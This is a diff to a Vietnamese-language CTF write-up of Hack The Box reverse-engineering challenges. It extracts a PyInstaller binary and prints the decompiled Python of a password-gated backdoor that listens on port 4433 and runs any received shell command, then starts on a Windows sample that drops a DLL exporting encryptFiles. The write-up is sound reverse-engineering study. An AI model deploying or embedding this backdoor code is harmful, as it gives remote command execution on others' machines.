@@ -455,7 +455,111 @@ Sorry for suspecting you, please transfer this important message to the chief: C
 
 ![image](https://user-images.githubusercontent.com/62060867/116241287-eee34b00-a78e-11eb-9d18-674f5060c0ee.png)
 
+* Thử thách này cũng cho ta một file ELF 64-bit
 
+```
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ file bd                                                                                                    100 ⨯ 1 ⚙
+bd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1da3a1d77c7109ce6444919f4a15e7e6c63d02fa, stripped
+                                                                                                                         
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ chmod +x  bd                                                                                                     1 ⚙
+                                                                                                                         
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ ./bd                                         
+```
 
+* Sau khi thử chạy file thì không có gì xảy ra
+* Mình đã tìm kiếm thông tin của file này và phát hiện đây là chương trình này đang chạy python file `pyc`
+* Mục tiêu là lấy được file `pyc`. Bắt đầu với `objcopy`
 
+```
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ objcopy --dump-section pydata=pydata.dump bd
+                                                                                                                         
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ ls    
+bd  pydata.dump
+```
+* Ta đã có được file dump extracted data, tiếp theo mình dùng [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor.git) để extract file dump này
+
+```
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ python pyinstxtractor/pyinstxtractor.py pydata.dump 
+[+] Processing pydata.dump
+[+] Pyinstaller version: 2.1+
+[+] Python version: 38
+[+] Length of package: 6994886 bytes
+[+] Found 45 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: bd.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+[!] Please run this script in Python38 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: pydata.dump
+
+You can now use a python decompiler on the pyc files within the extracted directory
+                                                                                                                         
+```
+* Vậy chúng ta đã có được file `bd.pyc`. Tiếp theo ta cần decompile file bd.pyc
+
+```
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
+└─$ decompyle3 pydata.dump_extracted/bd.pyc   
+# decompyle3 version 3.3.2
+# Python bytecode 3.8 (3413)
+# Decompiled from: Python 3.8.5 (default, Aug  2 2020, 15:09:07) 
+# [GCC 10.2.0]
+# Embedded file name: bd.py
+import socket
+from hashlib import md5
+from subprocess import check_output
+sock = socket.socket()
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('0.0.0.0', 4433))
+sock.listen(5)
+while True:
+    while True:
+        client, addr = sock.accept()
+        data = client.recv(32)
+        if len(data) != 32:
+            client.close()
+
+		if data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
+			client.send(b'Invalid')
+			client.close()
+		else:
+			size = client.recv(1)
+			command = client.recv(int.from_bytes(size, 'little'))
+			if not command.startswith(b'command:'):
+				client.close()
+			else:
+				command = command.replace(b'command:', b'')
+				output = check_output(command, shell=True)
+				client.send(output)
+				client.close()
+```
+* 
 # 4.Alienware
+
+[rev_alienware.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6386440/rev_alienware.zip)
+
+![image](https://user-images.githubusercontent.com/62060867/116285123-071b9000-a7b8-11eb-81e1-89a150187b3f.png)
+
+* Thử thách này cho ta một một file PE32+ và file encrypted 
+
+```
+┌──(kali㉿kali)-[~/Desktop/ReverseHTB/rev_alienware]
+└─$ file *                     
+Alienware.exe:          PE32+ executable (console) x86-64, for MS Windows
+Confidential.pdf.alien: data
+
+```
+
+* Phân tích funtion `TlsCallBack_0()`
+
+![image](https://user-images.githubusercontent.com/62060867/116287016-1996c900-a7ba-11eb-9fae-982be2e2b9a9.png)
+
+* Nhìn vào mình thấy nó tải một resource, giải mã nó và lưu trữ trên đĩa dưới dạng `xuTaV.dll`, sau đó nó load với `LoadLibrary` và nhận địa chỉ để xuất funtions `encryptFiles`
